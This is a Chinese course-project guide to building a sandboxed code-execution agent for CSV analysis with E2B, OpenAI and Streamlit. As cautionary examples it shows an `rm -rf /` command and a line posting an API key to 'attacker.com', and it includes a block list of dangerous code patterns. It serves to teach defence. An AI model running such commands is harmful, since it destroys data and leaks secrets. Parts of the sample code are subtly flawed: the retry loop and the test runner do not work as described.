# 项目 5：代码执行 Agent —— 数据分析助手

> **阶段**：Phase 2 - 系统构建
> **周次**：Week 6
> **难度**：⭐⭐⭐⭐
> **预估工时**：15-18 小时

---

## 一、项目目标

构建一个能自动写 Python 代码并执行的数据分析助手。用户上传 CSV，Agent 自动分析数据并生成图表。

**核心能力培养**：
- 沙箱隔离与安全
- 代码生成与执行
- 错误捕获与自我修复
- 资源限制
- 数据分析基础

---

## 二、为什么需要沙箱？

### 危险演示

```python
# ❌ 危险的代码：直接执行用户输入
user_code = input("请输入代码：")
exec(user_code)  # 极度危险！
```

**用户可能输入**：
```python
import os
os.system("rm -rf /")  # 删除整个系统！
```

**用户可能输入**：
```python
import requests
requests.post("http://attacker.com", json={"api_key": "xxx"})  # 窃取密钥
```

### 沙箱的作用

```
┌─────────────────────────────────────┐
│ 沙箱（隔离环境）                      │
│                                      │
│ ✅ 可以执行：                          │
│   - pandas, numpy, matplotlib        │
│   - 数据处理、图表生成                │
│                                      │
│ ❌ 不可以执行：                        │
│   - 文件系统操作（rm, write）         │
│   - 网络请求（敏感数据泄露）          │
│   - 系统命令（os.system）             │
│   - 长时间运行的死循环                │
└─────────────────────────────────────┘
```

### 沙箱方案对比

| 方案 | 隔离级别 | 性能 | 易用性 | 推荐场景 |
|------|----------|------|--------|----------|
| **直接 exec** | ❌ 无 | ⚡ 最快 | 😊 简单 | 永远不要用 |
| **Pyodide** | 🟡 低 | ⚡ 快 | 😊 简单 | 浏览器端 |
| **RestrictedPython** | 🟡 中 | ⚡ 快 | 😐 一般 | 简单脚本 |
| **E2B** | 🟢 高 | 🐢 中 | 😊 简单 | 生产环境 ✅ |
| **Docker** | 🟢 高 | 🐢 慢 | 😐 一般 | 自建环境 |
| **Kubernetes Pod** | 🟢 高 | 🐢 慢 | 😰 复杂 | 多租户 |

**推荐**：本项目用 **E2B**（开箱即用，安全性好）

---

## 三、详细任务说明

### 3.1 基础版任务（必做，10-12 小时）

#### Step 1：环境准备（1 小时）

**任务清单**：
- [ ] 注册 E2B 账号：https://e2b.dev
- [ ] 获取 API Key
- [ ] 安装依赖：`pip install e2b langchain pandas`
- [ ] 测试 E2B 连接

**E2B 注册流程**：
1. 访问 https://e2b.dev
2. GitHub 登录
3. 进入 Dashboard → API Keys
4. 复制 API Key
5. 设置环境变量：`export E2B_API_KEY="e2b_..."`

**测试代码**：
```python
from e2b_code_interpreter import Sandbox

# 创建沙箱
sandbox = Sandbox()

# 执行代码
execution = sandbox.run_code("print('Hello from sandbox!')")
print(execution.logs)  # ['Hello from sandbox!\n']

# 关闭沙箱
sandbox.close()
```

---

#### Step 2：构建基础 Agent（4 小时）

**任务清单**：
- [ ] Agent 根据用户问题生成 Python 代码
- [ ] 在 E2B 沙箱中执行
- [ ] 返回代码 + 执行结果

**完整代码**：
```python
from openai import OpenAI
from e2b_code_interpreter import Sandbox
import json
import re

class CodeExecutionAgent:
    """代码执行 Agent"""

    def __init__(self):
        self.client = OpenAI()
        self.sandbox = Sandbox()  # 创建沙箱
        self.conversation_history = []

    def generate_code(self, user_request: str, data_context: str = "") -> str:
        """生成 Python 代码"""
        system_prompt = """你是一个数据分析助手。根据用户需求生成 Python 代码。

要求：
1. 使用 pandas 处理数据，matplotlib/plotly 生成图表
2. 代码要完整可执行
3. 包含必要的 import
4. 用 print() 输出关键结果
5. 用 plt.show() 或 fig.savefig() 保存图表

输出格式：只输出 Python 代码，不要其他解释。代码用 ```python 包裹。"""

        user_prompt = f"""用户需求：{user_request}

数据上下文：
{data_context}

请生成 Python 代码："""

        response = self.client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ]
        )

        code = response.choices[0].message.content
        # 提取代码块
        code_match = re.search(r'```python\n(.*?)\n```', code, re.DOTALL)
        if code_match:
            return code_match.group(1)
        return code

    def execute_code(self, code: str) -> dict:
        """在沙箱中执行代码"""
        try:
            execution = self.sandbox.run_code(code)

            return {
                "success": True,
                "stdout": execution.logs.stdout,
                "stderr": execution.logs.stderr,
                "results": execution.results,
                "error": None
            }
        except Exception as e:
            return {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "results": None,
                "error": str(e)
            }

    def analyze(self, user_request: str, data_file_path: str = None) -> dict:
        """分析数据"""
        # 1. 如果有数据文件，先上传到沙箱
        data_context = ""
        if data_file_path:
            with open(data_file_path, "rb") as f:
                self.sandbox.files.write(f.name, f.read())
            data_context = f"数据文件路径：/home/user/{data_file_path.split('/')[-1]}"

        # 2. 生成代码
        code = self.generate_code(user_request, data_context)
        print(f"\n📝 生成的代码：\n{code}\n")

        # 3. 执行代码
        result = self.execute_code(code)

        # 4. 解释结果
        if result["success"]:
            explanation = self.explain_result(user_request, code, result)
            return {
                "code": code,
                "result": result,
                "explanation": explanation
            }
        else:
            return {
                "code": code,
                "result": result,
                "explanation": f"代码执行失败：{result['error']}"
            }

    def explain_result(self, request: str, code: str, result: dict) -> str:
        """用 LLM 解释执行结果"""
        response = self.client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[{
                "role": "user",
                "content": f"""用户需求：{request}

执行的代码：
```python
{code}
```

执行结果：
{result['stdout']}

请用通俗易懂的语言向用户解释这个结果（2-3 句话）。"""
            }]
        )
        return response.choices[0].message.content

    def close(self):
        """关闭沙箱"""
        self.sandbox.close()

# 使用
agent = CodeExecutionAgent()
result = agent.analyze(
    user_request="计算 1 到 100 的和",
)
print(result)
agent.close()
```

---

#### Step 3：支持 CSV 数据分析（3 小时）

**任务清单**：
- [ ] 用户上传 CSV
- [ ] Agent 读取数据，理解数据结构
- [ ] 根据用户问题生成分析代码
- [ ] 生成可视化图表

**完整实现**：
```python
import pandas as pd
import streamlit as st

# Streamlit 界面
st.title("📊 数据分析助手")

# 上传 CSV
uploaded_file = st.file_uploader("上传 CSV 文件", type=["csv"])

if uploaded_file:
    # 保存到临时文件
    with open("temp_data.csv", "wb") as f:
        f.write(uploaded_file.getbuffer())

    # 显示数据预览
    df = pd.read_csv("temp_data.csv")
    st.subheader("📋 数据预览")
    st.dataframe(df.head(10))

    st.subheader("📊 数据统计")
    st.write(df.describe())

    # 用户输入分析需求
    user_request = st.text_area("你想分析什么？", placeholder="例如：分析销售额的趋势，绘制月度变化图")

    if st.button("开始分析") and user_request:
        with st.spinner("Agent 正在分析..."):
            agent = CodeExecutionAgent()
            result = agent.analyze(
                user_request=user_request,
                data_file_path="temp_data.csv"
            )

            # 显示结果
            st.subheader("📝 生成的代码")
            st.code(result["code"], language="python")

            st.subheader("📊 执行结果")
            st.text(result["result"]["stdout"])

            # 显示图表（如果有）
            if result["result"]["results"]:
                for i, fig in enumerate(result["result"]["results"]):
                    if hasattr(fig, 'show'):  # matplotlib figure
                        st.pyplot(fig)
                    elif 'png' in str(type(fig)).lower():  # PNG image
                        st.image(fig)

            st.subheader("💡 结果解释")
            st.write(result["explanation"])

            agent.close()
```

---

#### Step 4：错误自我修复（2 小时）

**任务清单**：
- [ ] 代码执行失败时，Agent 看到错误信息
- [ ] 自动重新生成代码
- [ ] 最多重试 3 次

**实现**：
```python
def analyze_with_retry(self, user_request: str, data_file_path: str = None, max_retries: int = 3) -> dict:
    """带重试机制的分析"""
    for attempt in range(max_retries):
        print(f"\n🔄 尝试 {attempt + 1}/{max_retries}")

        # 生成代码
        code = self.generate_code(user_request)

        # 执行
        result = self.execute_code(code)

        if result["success"]:
            print("✅ 执行成功")
            return {
                "code": code,
                "result": result,
                "attempts": attempt + 1
            }

        print(f"❌ 执行失败：{result['error']}")

        # 把错误信息反馈给 LLM，让它重新生成
        if attempt < max_retries - 1:
            code = self._fix_code(code, result["error"], user_request)
            # 然后用修复后的代码再试...

    return {
        "code": code,
        "result": result,
        "attempts": max_retries,
        "error": "达到最大重试次数"
    }

def _fix_code(self, original_code: str, error: str, user_request: str) -> str:
        """让 LLM 修复代码"""
        response = self.client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[{
                "role": "user",
                "content": f"""以下 Python 代码执行出错，请修复：

原始代码：
```python
{original_code}
```

错误信息：
{error}

用户需求：{user_request}

请输出修复后的完整代码（用 ```python 包裹）。"""
            }]
        )

        fixed_code = response.choices[0].message.content
        code_match = re.search(r'```python\n(.*?)\n```', fixed_code, re.DOTALL)
        return code_match.group(1) if code_match else fixed_code
```

---

### 3.2 挑战版任务（选做 2 个，5-8 小时）

#### 挑战 1：多轮分析

**任务**：
- [ ] 用户可以基于上一轮结果继续提问
- [ ] Agent 维护数据状态

**实现**：
```python
class MultiTurnAnalysisAgent(CodeExecutionAgent):
    """多轮分析 Agent"""

    def __init__(self):
        super().__init__()
        self.data_loaded = False
        self.data_path = None
        self.history = []

    def analyze(self, user_request: str, data_file_path: str = None) -> dict:
        # 第一次上传数据
        if data_file_path and not self.data_loaded:
            self.data_path = data_file_path
            # 加载数据到沙箱
            ...
            self.data_loaded = True

        # 后续轮次：基于历史对话生成代码
        context = "\n".join([
            f"Q: {h['question']}\nA: {h['answer']}"
            for h in self.history[-3:]  # 最近 3 轮
        ])

        # 生成代码时考虑上下文
        code = self.generate_code(
            user_request,
            data_context=f"数据已加载，路径：{self.data_path}\n\n之前的分析：\n{context}"
        )

        # 执行...
        result = self.execute_code(code)

        # 保存到历史
        self.history.append({
            "question": user_request,
            "code": code,
            "result": result["stdout"]
        })

        return result
```

---

#### 挑战 2：单元测试自动生成

**任务**：
- [ ] Agent 生成代码后，自动生成单元测试
- [ ] 在沙箱中运行测试
- [ ] 确保代码质量

**实现**：
```python
def generate_unit_tests(self, code: str) -> str:
    """生成单元测试"""
    response = self.client.chat.completions.create(
        model="gpt-4o-mini",
        messages=[{
            "role": "user",
            "content": f"""为以下 Python 代码生成单元测试（用 pytest 格式）：

```python
{code}
```

要求：
1. 覆盖主要函数
2. 包含正常和异常用例
3. 用 pytest 格式"""
        }]
    )

    test_code = response.choices[0].message.content
    code_match = re.search(r'```python\n(.*?)\n```', test_code, re.DOTALL)
    return code_match.group(1) if code_match else test_code

def run_tests(self, test_code: str) -> dict:
    """运行测试"""
    # 在沙箱中运行 pytest
    result = self.execute_code(f"import subprocess; print(subprocess.run(['pytest', '-v'], capture_output=True, text=True).stdout)")
    return result
```

---

#### 挑战 3：沙箱资源监控

**任务**：
- [ ] 监控每次执行的 CPU/内存使用
- [ ] 超时自动终止
- [ ] 防止资源耗尽

**实现**：
```python
import signal
import resource
from contextlib import contextmanager

@contextmanager
def time_limit(seconds):
    """超时控制"""
    def signal_handler(signum, frame):
        raise TimeoutError("执行超时")

    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)

@contextmanager
def memory_limit(max_memory_mb):
    """内存限制"""
    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
    resource.setrlimit(resource.RLIMIT_AS, (max_memory_mb * 1024 * 1024, hard))
    try:
        yield
    finally:
        resource.setrlimit(resource.RLIMIT_AS, (soft, hard))

# 使用
def execute_with_limits(self, code: str) -> dict:
    try:
        with time_limit(30):  # 30 秒超时
            with memory_limit(512):  # 512 MB 内存限制
                return self.execute_code(code)
    except TimeoutError:
        return {"success": False, "error": "执行超时（30秒）"}
    except MemoryError:
        return {"success": False, "error": "内存超限（512MB）"}
```

**E2B 自带的资源限制**：
```python
sandbox = Sandbox(
    timeout=30,  # 执行超时
    cpu_count=2,  # CPU 核数
    memory_limit=512  # 内存限制（MB）
)
```

---

#### 挑战 4：多数据格式支持

**任务**：
- [ ] 支持 Excel、JSON、Parquet、SQLite
- [ ] 自动识别数据格式
- [ ] 生成对应格式的处理代码

**实现**：
```python
import magic  # pip install python-magic

def detect_file_type(file_path: str) -> str:
    """检测文件类型"""
    mime = magic.from_file(file_path, mime=True)
    if 'csv' in mime:
        return 'csv'
    elif 'excel' in mime or 'spreadsheet' in mime:
        return 'excel'
    elif 'json' in mime:
        return 'json'
    elif 'parquet' in mime:
        return 'parquet'
    return 'unknown'

def generate_code_for_file(self, user_request: str, file_type: str) -> str:
    """根据文件类型生成代码"""
    code_templates = {
        'csv': 'import pandas as pd\ndf = pd.read_csv("/home/user/data.csv")',
        'excel': 'import pandas as pd\ndf = pd.read_excel("/home/user/data.xlsx")',
        'json': 'import pandas as pd\ndf = pd.read_json("/home/user/data.json")',
        'parquet': 'import pandas as pd\ndf = pd.read_parquet("/home/user/data.parquet")'
    }

    template = code_templates.get(file_type, "")
    # 让 LLM 基于模板和用户需求生成完整代码...
```

---

#### 挑战 5：SQL 数据库查询

**任务**：
- [ ] Agent 连接数据库（SQLite、PostgreSQL）
- [ ] 用户用自然语言查询数据
- [ ] Agent 自动生成 SQL 并执行

**实现**：
```python
class SQLAgent(CodeExecutionAgent):
    """SQL 查询 Agent"""

    def __init__(self, db_path: str):
        super().__init__()
        self.db_path = db_path

    def analyze(self, user_request: str) -> dict:
        # 1. 让 LLM 生成 SQL
        sql = self.generate_sql(user_request)

        # 2. 在沙箱中执行 SQL
        code = f"""
import sqlite3
import pandas as pd

conn = sqlite3.connect('{self.db_path}')
df = pd.read_sql("{sql}", conn)
print(df.head(20))
"""

        return self.execute_code(code)

    def generate_sql(self, user_request: str) -> str:
        # 1. 获取数据库 schema
        schema = self._get_schema()

        # 2. 让 LLM 生成 SQL
        response = self.client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[{
                "role": "user",
                "content": f"""数据库表结构：
{schema}

用户需求：{user_request}

生成 SQL 查询语句："""
            }]
        )
        return response.choices[0].message.content
```

---

## 四、踩坑经验汇总

### 坑 1：沙箱超时

**现象**：长任务执行到一半被强制终止  
**原因**：默认超时时间太短  
**解决**：
```python
sandbox = Sandbox(timeout=120)  # 设为 120 秒
```

### 坑 2：生成代码有语法错误

**现象**：LLM 生成的代码直接 `SyntaxError`  
**解决**：
- 提取代码块时用正则严格匹配
- 让 LLM 在 Prompt 里强调"代码必须可执行"
- 失败时自动重新生成

### 坑 3：图表无法显示

**现象**：Streamlit 中 `st.pyplot()` 不显示图表  
**原因**：matplotlib 的 backend 问题  
**解决**：
```python
# 在生成的代码中加：
import matplotlib
matplotlib.use('Agg')  # 用非交互式 backend
import matplotlib.pyplot as plt
```

### 坑 4：数据上传失败

**现象**：大文件上传到沙箱超时  
**原因**：E2B 默认有大小限制  
**解决**：
- 数据分块上传
- 用 URL 传递（先传到 OSS，再让沙箱下载）

### 坑 5：Token 消耗大

**现象**：代码生成和解释消耗大量 Token  
**原因**：每次都把完整代码 + 结果发回 LLM  
**解决**：
- 只返回错误信息和关键结果
- 限制代码长度（太长时做摘要）

### 坑 6：沙箱不释放

**现象**：E2B 沙箱一直开着，费用增加  
**解决**：
```python
try:
    # 业务逻辑
    ...
finally:
    sandbox.close()  # 确保关闭
```

---

## 五、评估标准详解

### 及格（60 分）

- [ ] 沙箱集成成功
- [ ] Agent 能生成简单代码并执行
- [ ] CSV 文件可以分析
- [ ] 代码可运行

### 良好（75 分）

在及格基础上：
- [ ] 错误自我修复（重试机制）
- [ ] 自然语言解释结果
- [ ] 图表正确显示
- [ ] 代码结构清晰

### 优秀（90 分）

在良好基础上：
- [ ] 完成了至少 3 个挑战任务
- [ ] 多轮分析（基于历史继续分析）
- [ ] 单元测试自动生成
- [ ] 资源监控完善
- [ ] 有技术博客讲解沙箱原理

---

## 六、安全最佳实践

### 6.1 沙箱安全清单

- [ ] **代码不直接 `exec`**：必须用沙箱
- [ ] **网络隔离**：禁止沙箱访问敏感内部网络
- [ ] **资源限制**：CPU、内存、磁盘、时间
- [ ] **文件隔离**：沙箱内的文件系统与主机隔离
- [ ] **进程隔离**：每个用户/任务独立的沙箱实例
- [ ] **审计日志**：记录每次执行的代码

### 6.2 防御 Prompt 注入

```python
# 检测危险的代码
DANGEROUS_PATTERNS = [
    r'os\.system',
    r'subprocess',
    r'__import__',
    r'eval\(',
    r'exec\(',
    r'open\([\'"]\/(?:etc|var|root)',
    r'requests\.(?:get|post)',
]

def is_dangerous(code: str) -> bool:
    """检测危险代码"""
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, code):
            return True
    return False

if is_dangerous(code):
    return {"error": "代码包含危险操作，已阻止执行"}
```

### 6.3 用户教育

- 明确告诉用户："Agent 会在隔离沙箱中执行代码"
- 提供"代码审查"功能（让用户在执行前查看）
- 记录所有执行历史，可审计

---

## 七、交付物清单

- [ ] **代码仓库**（GitHub）
  - CodeExecutionAgent 完整代码
  - E2B 配置
  - 示例数据（CSV）
  - README.md
- [ ] **演示视频**（5-7 分钟）
  - 上传 CSV
  - 自然语言提问
  - Agent 生成代码
  - 图表展示
- [ ] **安全测试报告**（可选）
  - 危险代码测试
  - 沙箱隔离验证
  - Prompt 注入防御
- [ ] **技术博客**（可选，2000 字）
  - 沙箱原理
  - E2B vs Docker vs K8s 对比
  - 安全考虑

---

**下一步**：完成本项目后，进入 [项目 6：多 Agent 系统](../项目6-多Agent系统/README.md)
